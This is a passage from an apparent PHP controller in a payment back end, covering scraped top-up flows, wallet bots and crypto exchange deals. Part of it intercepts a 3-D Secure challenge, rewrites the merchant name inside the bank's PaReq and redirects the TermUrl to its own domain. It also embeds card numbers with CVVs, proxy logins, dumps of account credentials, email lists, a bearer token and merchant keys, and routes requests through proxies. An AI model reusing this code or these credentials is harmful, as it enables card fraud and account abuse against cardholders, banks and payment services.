			{
				sleep(2);
				//step 12
				$url = 'https://www.a-3.ru/front/msp/apply_3ds.do';
				$sender->additionalHeaders = false;
				$postData = 'operation_id='.$operationId;
				$sender->additionalHeaders = [
					'Host: www.a-3.ru',
					$userAgent,
					'Accept: */*',
					'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
					'Accept-Encoding: gzip, deflate, br',
					'Content-Type: application/x-www-form-urlencoded',
					'Content-Length: '.strlen($postData),
					'DNT: 1',
					'Connection: keep-alive',
					'Referer: https://www.a-3.ru/pay_mobile/',
					'Pragma: no-cache',
					'Cache-Control: no-cache'
				];
				$content = $sender->send($url, $postData, $proxy);

				if(!$dataArr = @json_decode($content, true))
				{
					if(YII_DEBUG)
					{
						echo json_encode(['errorMsg'=>'error 13']);die;
					}
					else
						prrd('error 13');
				}
				elseif(isset($dataArr['response_data']['pareq']))
				{
					$formData = base64_decode($dataArr['response_data']['pareq']);

//					exit($formData);

					if(preg_match('!name="mainform"\s+action="(.+?)"!iu', $formData, $matches))
						$mainFormUrl = $matches[1];
					else
					{
						if(YII_DEBUG)
						{
							echo json_encode(['errorMsg'=>'error 14']);die;
						}
						else
							prrd('error 14');
					}

					if(preg_match('!name="PaReq" style="display:none">(.+?)<!iu', $formData, $matches))
						$paReq = $matches[1];
					else
					{
						if(YII_DEBUG)
						{
							echo json_encode(['errorMsg'=>'error 15']);die;
						}
						else
							prrd('error 15');
					}

					if(preg_match('!name="TermUrl" value="(.+?)"!iu', $formData, $matches))
						$termUrl = $matches[1];
					else
					{
						if(YII_DEBUG)
						{
							echo json_encode(['errorMsg'=>'error 16']);die;
						}
						else
							prrd('error 16');
					}

					if(preg_match('!name="MD" value="(.+?)"!iu', $formData, $matches))
						$md = $matches[1];
					else
					{
						if(YII_DEBUG)
						{
							echo json_encode(['errorMsg'=>'error 17']);die;
						}
						else
							prrd('error 17');
					}

					//замена провайдера в банке
					$strOut = gzuncompress(base64_decode($paReq));
					$strOut = preg_replace('!<name>.+?</name>!', '<name>Paymentprocessing</name>', $strOut);
					$updatedPareq = base64_encode(gzcompress($strOut));

					$checkArr = [
						'basketId' => $basketId,
						'paidServices' => $paidServiceId,
						'source' => 'a3',
						'sum' => $totalSum,
						'transactionIdA3' => $transactionIdA3,
						'termUrl' => $termUrl,
						'cardNumber' => $cardNumber,
						'operationId' => $operationId,
					];


					//TODO: тут данные выводились в форму, под апи вроде бы так же будет
					$redirParams = [
						'MD' => $md,
						'PaReq' => $updatedPareq,
						'TermUrl' => 'https://moneytransfer.life/test.php?r=test/FinishPayment&basketId='.$basketId.'&paidServices='.$paidServiceId.'&sum='.$totalSum.'&transactionIdA3='.$transactionIdA3.'&termUrl='.$termUrl.'&cardNumber='.$cardNumber.'&operationId='.$operationId,
					];

					$result['result'] = [
						'url'=>$mainFormUrl,
						'postArr'=>$redirParams,
					];

					if($result)
						echo json_encode($result);
					else
						echo json_encode(['errorMsg'=>'ошибка запроса, повторите попытку позднее']);

					Yii::app()->end();

				}
				else
				{
					if(YII_DEBUG)
					{
						echo json_encode(['errorMsg'=>'error не перекидывает на смс']);die;
					}
					else
						prrd('error, try request later');
				}

			}

		//TODO: если графически тестить
//			$this->render('fail', [
//				'order' => $order,
//				'cacheParams' => $_SESSION['cacheParams'],
//			]);



		prrd('error paymetn');
		die;

		//TODO: если графически тестить
		//для накладки вьюха
//		}
//		$this->render('form', [
//			'order' => $order,
//			'cacheParams' => $_SESSION['cacheParams'],
//		]);
	}

	public function actionPares()
	{
		$content = '{"mimeType": "text/html; charset=UTF-8",
"size": 2596,
"text": "<!DOCTYPE html SYSTEM \"about:legacy-compat\">\n<html class=\"no-js\" lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\n<meta charset=\"utf-8\"/>\n<title>3D Secure Processing</title>\n<link href=\"https://securepay.rsb.ru/mdpaympi/static/mpi.css\" rel=\"stylesheet\" type=\"text/css\"/>\n</head>\n<body>\n<div id=\"main\">\n<div id=\"content\">\n<div id=\"order\">\n<h2>3D Secure Processing</h2>\n<img src=\"https://securepay.rsb.ru/mdpaympi/static/preloader.gif\" alt=\"Please wait..\"/>\n<img src=\"https://securepay.rsb.ru/mdpaympi/static/mc_idcheck_hrz_ltd_pos_103px.png\" alt=\"MasterCard ID Check\"/>\n<div id=\"formdiv\">\n<script type=\"text/javascript\">\nfunction hideAndSubmitTimed(formid)\n{\nvar timer=setTimeout(\"hideAndSubmit(\'\"+formid+\"\');\",100);\n}\n\nfunction hideAndSubmit(formid)\n{\nvar formx=document.getElementById(formid);\n\tif (formx!=null)\n\t{\n\tformx.style.visibility=\"hidden\";\n\tformx.submit();\n\t}\n}\n</script>\n<div>\n<form id=\"webform0\" name=\"red2Mer\" method=\"POST\" action=\"https://securepay.rsb.ru:443/ecomm2/ClientHandler\" accept_charset=\"UTF-8\">\n<input type=\"hidden\" name=\"_charset_\" value=\"UTF-8\"/>\n<input type=\"hidden\" name=\"version\" value=\"2.0\"/>\n<input type=\"hidden\" name=\"merchantID\" value=\"9295351704\"/>\n<input type=\"hidden\" name=\"xid\" value=\"SgtSVkBdaIFg9BS3vrKfxn8ZoME=\"/>\n<input type=\"hidden\" name=\"mdStatus\" value=\"1\"/>\n<input type=\"hidden\" name=\"mdErrorMsg\" value=\"Authenticated\"/>\n<input type=\"hidden\" name=\"txstatus\" value=\"Y\"/>\n<input type=\"hidden\" name=\"iReqCode\" value=\"\"/>\n<input type=\"hidden\" name=\"iReqDetail\" value=\"\"/>\n<input type=\"hidden\" name=\"vendorCode\" value=\"\"/>\n<input type=\"hidden\" name=\"eci\" value=\"02\"/>\n<input type=\"hidden\" name=\"cavv\" value=\"jHh+kY1bxDZyCREAWsxgAYYAAAA=\"/>\n<input type=\"hidden\" name=\"cavvAlgorithm\" value=\"3\"/>\n<input type=\"hidden\" name=\"MD\" value=\"\"/>\n<input type=\"hidden\" name=\"PAResVerified\" value=\"true\"/>\n<input type=\"hidden\" name=\"PAResSyntaxOK\" value=\"true\"/>\n<input type=\"text\" name=\"digest\" value=\"lLfY9IIaUVVhKAXoRj4Hl5496M4=\" readonly=\"true\" style=\"display:none;\"/>\n<input type=\"hidden\" name=\"sID\" value=\"2\"/>\n<input type=\"submit\" name=\"submitBtn\" value=\"Please click here to continue\"/>\n</form>\n</div>\n</div>\n<script type=\"text/javascript\">\n\t\t\thideAndSubmitTimed(\'webform0\');\n\t\t</script>\n<noscript>\n<div align=\"center\">\n<b>Javascript is turned off or not supported!</b>\n<br/>\n</div>\n</noscript>\n</div>\n<div id=\"content-footer\">\n<br/>\n<img height=\"20\" src=\"https://securepay.rsb.ru/mdpaympi/static/powered-by-modirum.svg\" alt=\"Powered by Modirum\"/>\n</div>\n</div>\n</div>\n</body>\n</html>\n"}';

		var_dump(html_entity_decode(arr2str(json_decode($content),1)));die;
	}

	public function actionParams()
	{
		$termUrl = 'https://securepay.rsb.ru/mdpaympi/MerchantServer/msgid/105364121';

		if(preg_match('!msgid/(\d+)!', $termUrl, $matches))
		{
			var_dump($matches[1]);
		}
		else
			prrd('error1');
	}

	public function actionParseForm()
	{
		$content = '

    <body OnLoad="document.forms[0].submit();">
    <form action="index.php" method="get" target="_parent">
        <input type="hidden" name="route[merchant]" value="step2/Acquiring">
        <input type="hidden" name="merchant[InvoiceId]" value="3449758861">
        <input type="hidden" name="merchant[AcquiringAction]" value="AcquiringPaymentCheckState">
        <input data-route="param" type="hidden" name="merchant[AcquiringPaymentProcessing]" value="1">
            <input type="hidden" name="csrf_token" value="530bbe623d11d981ac03bb3ad690bcf0"></form>
</body>


';

		var_dump(htmlentities($content));die;

		if(!preg_match('!name="merchant\[InvoiceId\]" value="(.+?)"!', $content, $matches))
			exit('error 6');
		$merchantInvoiceId = $matches[1];

		if(!preg_match('!name="merchant\[AcquiringAction\]" value="(.+?)"!', $content, $matches))
			exit('error 7');
		$merchantAcquiringAction = $matches[1];

		if(!preg_match('!name="merchant\[AcquiringPaymentProcessing\]" value="(.+?)"!', $content, $matches))
			exit('error 8');
		$merchantAcquiringPaymentProcessing = $matches[1];

		if(!preg_match('!name="csrf_token" value="(.+?)"!', $content, $matches))
			exit('error 9');
		$csrfToken = $matches[1];

		var_dump('success');die;


	}

	public function actionTestUrl()
	{
		var_dump(IntellectTransaction::getPayUrl(
			[
				'amount' => 100.01,
				'successUrl' => 'site.com/success',
				'failUrl' => 'site.com/fail',
				'orderId' => 143123412,
			], 'GFJBHAAEJRQXABGH'));die;
	}

	/**
	  	'hash'=>$hash,
	  	'orderId'=>$orderId,
		'cardNumber' => $postData['cardNumber'],
		'cardM' => $postData['cardM'],
		'cardY' => $postData['cardY'],
		'cardCvv' => $postData['cardCvv'],
		'headers' => $headers,
		'browser' => '',
		'referer' => '',
	 */
	public function actionUpdateTransactionInfo()
	{
		var_dump(IntellectTransaction::updateTransactionDetails(
			[
				'hash' => '0c98d7409736bca36f6b4ee55e1ff042',
				'orderId' => time(),
				'cardNumber' => '5246029706290881',
				'cardM' => '04',
				'cardY' => '22',
				'cardCvv' => '275',
				'cardHolder' => 'Ivan Ivanov',
				'headers' => '',
				'browser' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0',
				'referer' => '0c98d7409736bca36f6b4ee55e1ff042',
			]));
		die;
	}

	public function actionGetPayParams()
	{
		$params = [];
		var_dump(IntellectMoneyBot::getPayParams($params));
	}


	public function actionNotifyOutOfLimit()
	{
		YandexAccount::notifyOutOfLimit();
	}

	public function actionRegExpr()
	{
		$accounts ="1675719511|wydpfp@tutanota.com|jlsdfjs435ljJ-sfj|4433|6767 1523452345|adfasdff32@tutanota.com|KLjfsnKJfjkls324|2323|4343";

		if(preg_match_all('!(\d{5,20})(\|(.+?@\w+?\.[\w\s]+|))(\|(.+?)|)(\|([\d\s]+)|)(\|(\d{4}))!', $accounts, $res))
		{
			var_dump($res);
			//die;
		}
		else
			exit('error');

		$accountArr = [];

		foreach($res[1] as $key=>$parsedLine)
		{
			$accountArr[] = [
				'internalId'=>$res[1][$key],
				'email'=>$res[3][$key],
				'password'=>$res[5][$key],
				'formId'=>$res[7][$key],
				'pinCode'=>$res[9][$key],
			];
		}

			//$result[] = array('login'=>$login, 'pass'=>$matches[2][$key],'api_token'=>$matches[3][$key]);

//		}


		var_dump($accountArr);die;
	}

	public function actionInternalIntellect()
	{
		/**
		 * @var IntellectAccount $account
		 */
		$account = IntellectAccount::model()->findByPk(1);

		$account->withdrawMoney();die;
	}

	public function actionArrCond()
	{
		//test values
		$userId = 721;
		$dateFrom = 1577826000;
		$dateTo = time();

//		var_dump('res1 : '.arr2str(MerchantTransaction::getStats($dateFrom, $dateTo, 0, $userId)));
//		var_dump('res2 : '.arr2str(MerchantTransaction::getStatsNew($dateFrom, $dateTo, 0, $userId)));
//
//		die;

//		var_dump('res1: '.count(MerchantTransaction::getModels($dateFrom, $dateTo, $userId)));
//		var_dump('res2: '.count(MerchantTransaction::getModelsNew($dateFrom, $dateTo, $userId)));
//
//		die;

		$walletType = array(
			'qiwi_wallet',
			'qiwi_card',
			'yandex'
		);

		//необходимо для разделения статистики по киви и яду
		$typeCond = " ('".implode("', '", $walletType)."') ";

		if(!is_array($walletType))
			return false;

		$result = 0;

		if($dateFrom and $dateTo and $user = User::getUser($userId))
		{


			//если админ то всех юзеров за период
			if($user->role==User::ROLE_ADMIN)
				$userCond = " and mt.user_id <>'0' ";
			else
				$userCond = " and mt.user_id = '{$user->id}' ";

			$models=MerchantTransaction::model()->findAllBySql('
				select `amount` from merchant_transaction as mt
				inner join merchant_wallet as mw
				on mt.merchant_wallet_id = mw.id '.$userCond.'
				and mt.date_add>='.$dateFrom.' and mt.date_add<'.$dateTo.'
				and mw.type in '.$typeCond
	  	  	);

//			var_dump($models);

			$result2 = 0;

			if($models)
			{
				foreach($models as $model)
				{
					$result2 += $model->amount;
				}

			}

			var_dump($result2);

			//если админ то всех юзеров за период
			if($user->role==User::ROLE_ADMIN)
				$userCond = "`user_id`<>'0' AND ";
			else
				$userCond = "`user_id`='{$user->id}' AND ";

			$models2 = MerchantTransaction::model()->findAll(array(
				'condition'=>"
					$userCond
					 `type`='".MerchantTransaction::TYPE_IN."'
					 AND `status`='".MerchantTransaction::STATUS_SUCCESS."'
					 AND `date_add`>=$dateFrom and `date_add`<$dateTo
					 AND `status`='success'
					 AND `client_id` <> 0
					 ",
				'order'=>"`id` DESC",
			));

			if($models2)
			{
				foreach($models2 as $model)
				{
					$result += $model->amount;
				}

			}
		}

		prrd($result);

	}

	public function actionSignature()
	{
		$merchantKey = 'RSzUjX8z9zIfn9B';
		$orderNr = '123123';
		$amount = '100';
		$currency = 'USD';
		$merchSig = 'cE8f8xkbBaDDvlyT5cqw7uW41A2RqDrbAgeIc5lOwzraa';

		prrd(md5($merchantKey.'|'.$orderNr.'|'.$amount.'|'.$currency.'|'.$merchSig));
	}

	public function actionGetMegaParams()
	{
		$amount = 100;
		$orderId = 123123;
		$params['successUrl'] = 'https://quicktransfer.pw/index.php?r=success';
		$params['failUrl'] = 'https://quicktransfer.pw/index.php?r=fail';
		$params['cardNumber'] = '4890494707844221';
		$params['cardM'] = '12';
		$params['cardY'] = '20';
		$params['cardCvv'] = '305';
		$params['receiveMegaphone'] = '79372901797';

		$payment = new PaySol('5e0b252140aa7906d02b2628', '_brt-0zH65Gc_oqBYepgAO-XsNKf-LN1', 'BrfVkPvK42XEltyIzPMyDoK7CEeCVVc_');
		$result = $payment->createOrder(
			$amount,
			$orderId,
			'processing',
			'https://apiapi.pw/index.php?r=api/MegafonCollback&key=api_key128312683',
			$params['successUrl'],
			$params['failUrl'],
			$params['cardNumber'],
			$params['cardM'].'/'.$params['cardY'],
			'ANONYMOUS CARD',
			$params['cardCvv'],
			$params['receiveMegaphone']
		);


		/**
		 * object(stdClass) #48 (3) {
		 * ["state"]= > string(7) "created"
		 * ["orderId"] => string(24) "5e3993c62651bf55a310414c"
		 * ["acs"] => object(stdClass) #49 (2) {
		 * 		["action"]= > string(68) "https://3DSecure.qiwi.com/acs/pareq/e559c097f3e3475497490f214964a7c9"
		 * 		["form"] => object(stdClass) #52 (3) {
		 * 			["PaReq"]= > string(516) "eJxVUl1vozAQ/CuId2Ls2glEG1fcJdH1pKSoTV/65pglQQofMXBN+uvPhuR6RQbtDOud3bHh8VKevD9o2qKuFj6dhL6Hla6zojos/LfdOoj8Rwm7o0FcvqLuDUrYYNuqA3pFtvAbZfA8iWexptNZHuB+rwM+i0UQxUiDMI54xBTPM8Z9CWnygmcJNzlp1SYMyB3aukYfVdVJUPr842kreSjEgwByg1CieVrKcHzo8BEcyEhDpUqUqbqm6gRkAKDrvurMVU75A5A7gN6c5LHrmnZO7N6DyutqYnogjgfy1UXau6i1dS5FJjfL5GN8V/R5mfDN54o971Zsu0sWQFwGZKpDyUIW2sU9KuaCzwUFMvCgSteAHPq2M40IGieSfPv1PwXWcmNP5D7DHQFemrpCm2Ed/BdDhq2WH7j3GnUtLWO1HQPka5afv5y/urOWccqmYhbzuH5dr0+5KMPtO4+un/x3njrXhySnVFjbWEhHKQeAuDLkdqDkdiNs9O2m/AXqt8Md"
		 * 			["MD"] => string(36) "365e3b0b-69be-4818-9ccc-ca8541998ca7"
		 * 			["TermUrl"] => string(60) "http://0.0.0.0:9001/payment/5e3993c62651bf55a310414c/confirm"
			}
				}
		}
		 */

		$params = [];


		var_dump($result);

		if($result->state == 'created')
		{
			if($result->acs->form->TermUrl)
				$termUrl = str_replace('http://0.0.0.0:9001', 'https://senses.paymaster.name', $result->acs->form->TermUrl);
			else
				$termUrl = '';

			$params['url'] = $result->acs->action;
			$params['postArr'] = [
				'MD' => $result->acs->form->MD,
				'PaReq' => $result->acs->form->PaReq,
				'TermUrl' => $result->acs->form->TermUrl,
			];

			var_dump($params);die;
		}
		else
			exit('finish error');


		var_dump($result);die;
	}

	public function actionWalletS()
	{
		$bot = new WalletSBot(true);
		$currency = 'EUR';
		$value = 1;
		var_dump($bot->getSum($currency, $value));
//		[merchant_key] => RSzUjX8z9zIfn9B
//	[order_nr] => 22222222
//		[amount] => 100
//		[currency] => RUB
//	[pay_amount] => 100
//		[pay_currency] => RUB
//	[status] => ok
//	[error_code] =>
//		[error_msg] =>
//		[payment_id] => 184
//		[payment_type] => SMS
//	[payment_date] => 03.02.2020 18:22:44
//		[attributes] =>
//		[pan] => 440588******1576
//		[hash] => fd2487a2ae03315fd8d2883b29ba3e88
//
//		die;
		$emailStr  = 'FigueiraSoriyah92@mail.ru
EfeEwards@mail.ru
AvireeCione1994@mail.ru
DrubeAirianna@mail.ru
ElizabethmarieDaprile2000@mail.ru
ZymeriaMetz@mail.ru
HarleequinnCogdell1992@mail.ru
FathimaFecto@mail.ru
TearaJagger1996@mail.ru
EllisonSae@mail.ru
LickfeltLiyat2001@mail.ru
KaevionVanderploeg1992@mail.ru
OckimeyGenecis1998@mail.ru
JasiaVickroy1994@mail.ru
OlewineHailei1998@mail.ru
PaxleyTeas92@mail.ru';

		var_dump(WalletSEmail::addMany($emailStr));die;

		$successUrl = "https://www.google.com/";
		$failUrl = "https://www.ya.ru/";

		var_dump(WalletSTransaction::getPayUrl(100, 222223, 'оплата', 'FigueiraSoriyah92@mail.ru', $successUrl, $failUrl));die;
//		$json = '{"merchant_key":"x8emm71MGitPh9C","order_nr":"123123","amount":"100","currency":"USD","payer_email":"","payer_name":"IVAN","payer_lname":"IVANOV","lang":"RU","description":"payment_123123","success_url":"https:\/\/www.google.com\/","success_method":"GET","cancel_url":"https:\/\/www.ya.ru\/","cancel_method":"GET","callback_url":"https:\/\/www.google.com\/","callback_method":"POST","hash":"c74a1344704d6c6fbe94bd794f40e198"}';
//
//		var_dump(json_decode($json, 1));
//		die;


//		$bot = new WalletSBot('dpNS6XtyUo:proxmail1123123@91.107.119.79:42071', true);
		$bot = new WalletSBot(true);

		$params = [
			"order_nr" => "123121",
			"amount" => "100",
			"payer_name" => "IVAN",
			"payer_lname" => "IVANOV",
			"description" => "payment_123123",
			"success_url" => "https://www.google.com/",
			"cancel_url" => "https://www.ya.ru/",
			"payer_email" => "FigueiraSoriyah92@mail.ru:2pWQsWXmaCS",
		];
		var_dump($bot->createInvoice($params));

	}

	public function actionWalletSParser()
	{
		$url = '';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->proxyType = 'http';
		$proxy = 'dpNS6XtyUo:proxmail1123123@194.116.163.247:42071';

		$url = 'https://walletesvoe.com/ru/processing/payment/uRiRTwmBv5MeO7g5TW8HivtEY';

		$content = $sender->send($url, false, $proxy);

		if(!preg_match('!href="(.+?)">!', $content, $matches))
		{
			exit('error1');
		}

		$url = $matches[1];

		$userAgent = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0';

		$sender->additionalHeaders = [
			'Host: walletesvoe.com',
			$userAgent,
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'DNT: 1',
			'Connection: keep-alive',
			'Upgrade-Insecure-Requests: 1',
			'Pragma: no-cache',
			'Cache-Control: no-cache',
			'TE: Trailers'
		];

		$content = $sender->send($url, false, $proxy);

		if(preg_match('!"error_msg" value="(.+?)"!', $content, $matches))
			exit('error2: '.$matches[1]);

		die;
	}



	public function actionGetPayMegafon()
	{
		//var_dump(json_decode('{"code": 1, "message": "\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430. "}', 1));die;
		$params = [];
		var_dump(SimTransaction::getBankUrlMegafon($params));die;
	}

	public function actionGetBrowser()
	{
//		$params = [
//			'invoiceId' => '6uVypKjUg9AYasNi',
//			'payUrl' => 'https://walletesvoe.com/processing/invoice/6uVypKjUg9AYasNi',
//			'email' => 'vasilivieru@mail.ru',
//		];
//
//		var_dump('https://easyexchange.pw?param='.base64_encode(json_encode($params)));die;
//
//		$url = 'https://easyexchange.pw?param=aHR0cHM6Ly93YWxsZXRlc3ZvZS5jb20vcHJvY2Vzc2luZy9pbnZvaWNlLzZ1VnlwS2pVZzlBWWFzTmk=';
//		var_dump(base64_decode('aHR0cHM6Ly93YWxsZXRlc3ZvZS5jb20vcHJvY2Vzc2luZy9pbnZvaWNlLzZ1VnlwS2pVZzlBWWFzTmk='));die;
		var_dump(get_browser("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0", true));die;
	}

	public function actionTokenRiseX()
	{
		$sender = new Sender;
		$sender->followLocation = true;
		$sender->proxyType = 'http';
		$proxy = 'yGAUfYWnM3:pytivcev@93.189.46.22:41573';

		$url = 'https://api.risex.net/api/v1/auth/sign-in';

		$postData = [
			'login' => 'msksigtd@tutanota.com',
			'password' => 'ls#kjflkj@41451lkj234',
			'remember_me' => 1,
		];


		$sender->additionalHeaders = [
			'Content-Type: application/json',
			"Accept: application/json"
		];


		$content = $sender->send($url, json_encode($postData), $proxy);

		$userAgent = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0';


		var_dump($content);
		die;
	}

	public function actionJsonShow()
	{
		$str = '{"data":{"id":61548,"author":{"id":3089,"login":"johnatanslow","avatar":null,"last_seen":"2020-03-20 13:20:44 +03:00","trust_coef":100,"negative_count":0,"positive_count":0,"appeal":null,"statistics":{"id":3106,"created_at":"2020-03-14 23:56:05 +03:00","updated_at":"2020-03-19 22:57:09 +03:00","total_turnover":0,"deals_cancellation_percent":0,"deals_finished_count":0,"deals_canceled_count":3,"deals_disputed_count":0,"deals_paid_count":0,"deals_count":3,"average_finish_deal_time":0,"reviews_coefficient":0,"fast_timed_deals":0,"slow_timed_deals":0,"total_timed_deals":0,"fast_trader":true,"fast_trade_percent":100},"email_confirmed":false,"phone_confirmed":false,"created_at":"2020-03-14 23:56:05 +03:00"},"offer":{"id":9,"login":"waider","avatar":"https:\/\/api.risex.net\/storage\/images\/61.png","last_seen":"2020-03-20 13:03:47 +03:00","trust_coef":100,"negative_count":0,"positive_count":28,"appeal":null,"statistics":{"id":9,"created_at":"2019-02-12 17:20:36 +03:00","updated_at":"2020-03-20 12:59:39 +03:00","total_turnover":32227,"deals_cancellation_percent":64,"deals_finished_count":336,"deals_canceled_count":597,"deals_disputed_count":0,"deals_paid_count":1,"deals_count":933,"average_finish_deal_time":441990,"reviews_coefficient":6699752,"fast_timed_deals":67,"slow_timed_deals":0,"total_timed_deals":67,"fast_trader":true,"fast_trade_percent":100},"email_confirmed":true,"phone_confirmed":false,"created_at":"2019-02-12 17:20:36 +03:00"},"ad":{"id":13,"author":{"id":9,"login":"waider","avatar":"https:\/\/api.risex.net\/storage\/images\/61.png","last_seen":"2020-03-20 13:03:47 +03:00","trust_coef":100,"negative_count":0,"positive_count":28,"appeal":null,"statistics":{"id":9,"created_at":"2019-02-12 17:20:36 +03:00","updated_at":"2020-03-20 12:59:39 +03:00","total_turnover":32227,"deals_cancellation_percent":64,"deals_finished_count":336,"deals_canceled_count":597,"deals_disputed_count":0,"deals_paid_count":1,"deals_count":933,"average_finish_deal_time":441990,"reviews_coefficient":6699752,"fast_timed_deals":67,"slow_timed_deals":0,"total_timed_deals":67,"fast_trader":true,"fast_trade_percent":100},"email_confirmed":true,"phone_confirmed":false,"created_at":"2019-02-12 17:20:36 +03:00"},"payment_system":{"id":3,"title":"\u0411\u0430\u043d\u043a\u0438","icon":"https:\/\/api.risex.net\/storage\/images\/167.png"},"banks":[{"title":"\u0421\u0431\u0435\u0440\u0431\u0430\u043d\u043a","id":2,"icon":"https:\/\/api.risex.net\/storage\/images\/31.png"}],"country":"\u0420\u043e\u0441\u0441\u0438\u044f","country_id":1,"is_sale":true,"currency":{"id":1,"code":"RUB","icon":"https:\/\/api.risex.net\/storage\/images\/202.svg"},"crypto_currency":{"id":1,"code":"btc","title":"Bitcoin","icon":"https:\/\/api.risex.net\/storage\/images\/199.svg"},"price":"568560","min":"200","max":"20000","is_active":true,"is_public":true,"created_at":"2019-02-18 12:19:45 +03:00","conditions":"","is_deleted":false,"requisites":null},"status":{"id":7,"title":"Verification","created_at":"2020-03-20 13:20:44 +03:00"},"status_history":[{"id":7,"title":"Verification","created_at":"2020-03-20 13:20:44 +03:00"}],"bank":null,"payment_system":{"id":3,"title":"\u0411\u0430\u043d\u043a\u0438","icon":"https:\/\/api.risex.net\/storage\/images\/167.png"},"currency":{"id":1,"title":"\u0420\u0443\u0431\u043b\u044c","icon":"https:\/\/api.risex.net\/storage\/images\/202.svg"},"crypto_currency":{"id":1,"title":"Bitcoin","icon":"https:\/\/api.risex.net\/storage\/images\/199.svg"},"crypto_amount":"0.00035177","price":"568560","fiat_amount":"200","conditions":null,"time":60,"created_at":"2020-03-20 13:20:44 +03:00","commissions":{"offer":"0.00000212","client":"0.00001759"}}}';
			var_dump(json_decode($str, 1));die;
	}

	public function actionCreateDeal()
	{
		$user = User::getUser();
		if(!RisexTransaction::createDeal($user, 200))
		{var_dump(RisexTransaction::$lastError);die;}
		else
			exit('done');

		die;
		$sender = new Sender;
		$sender->followLocation = true;
		$sender->proxyType = 'http';
		$proxy = 'yGAUfYWnM3:pytivcev@93.189.46.22:41573';

		$url = 'https://api.risex.net/api/v1/deal/trusted';

		$postData = [
			'is_sale' => '1',
			'fiat_amount' => '200',
			'payment_system_id' => '3',
			'currency_id' => '1',
			'crypto_currency_id' => '1',
		];


		$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjQ2M2Y4MGVlZmFiYzQ2NDI4MGM3YjAxNzg1NjhjYzNjZDE2NTM3NjMxNTJkMjZiNmNmODNmNjY0ZTNhZTcwNGY4NGI2YmRlNTcwMjdlZTAwIn0.eyJhdWQiOiIxIiwianRpIjoiNDYzZjgwZWVmYWJjNDY0MjgwYzdiMDE3ODU2OGNjM2NkMTY1Mzc2MzE1MmQyNmI2Y2Y4M2Y2NjRlM2FlNzA0Zjg0YjZiZGU1NzAyN2VlMDAiLCJpYXQiOjE1ODQ2MjY3NjAsIm5iZiI6MTU4NDYyNjc2MCwiZXhwIjoxNjE2MTYyNzYwLCJzdWIiOiIzMDg5Iiwic2NvcGVzIjpbXX0.xErmi1n1lXGPG0Jq_fEThuvMmfSZNEbW2iKu1s6FZJJgNWDuX6Qn3IhoR8P_2nsea9FwcvaP3vQwje5mi-neYrZKJpTJY1txQpi2iHSfOAK9H5nl-uEVCPvA4f767uKcLywQnTqLesbsyIoak7qcNVHPKfpuVPo1ci37dWt5N26I7nnyDYUBFA3Pl9YPmXJ1ulm8v-oeDwhU7KuDIDNhMgxwO082q4l4FO9eOLKV5hjGIlMBP2s0xOQFnA34BI48J8UrKtgWaV8SMcJMpakhAYXPMeYcYAEYN_5CG1g18c1eFDsh4dCbVNIPiG9AODMPgricNPf2ZAY7Y_ywtD9skZzM7uEQkk-Iisha4u2LrKEoe9cTW-bMmpl6LPzWb-FEqgnvwpfI09IohV91OGuJt0vXCUD37Jcm8vMSk_El9tH4aBzU2qaQ4x6hqDs-oE5CXQouUxzjU74jFFajOlndlW64DZ8B0LEtoTQm-4prSbBYg1kWWZ3b0MSB0j1LY3RXe2jFn3PahY1A9-ui6SgcRTWnwPmQ85twqIODDsriw-wecNONNtjl6J6O8REX4JgYxZLALxv9pKDXg3LUOsVnjz5_AfYhmKPJmagv6IOcvGE4Rp7Byu2XkBaEWFZFNU732I5IAo5b2f766sOOKkRj4sXlOt2vM-8fCBtg1RjwQfU';
		$sender->additionalHeaders = [
			'Content-Type: application/json',
			"Authorization: Bearer {$token}",
			"Accept: application/json"
		];


		$content = $sender->send($url, json_encode($postData), $proxy);

		$userAgent = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0';


		var_dump($content);
		die;
	}

	public function actionRequisites()
	{
		$sender = new Sender;
		$sender->followLocation = true;
		$sender->proxyType = 'http';
		$proxy = 'yGAUfYWnM3:pytivcev@93.189.46.22:41573';

		$url = 'https://api.risex.net/api/v1/dashboard/requisites';

		$postData = [
			'deals' => ['1'],
			'per_page' => '100',
		];

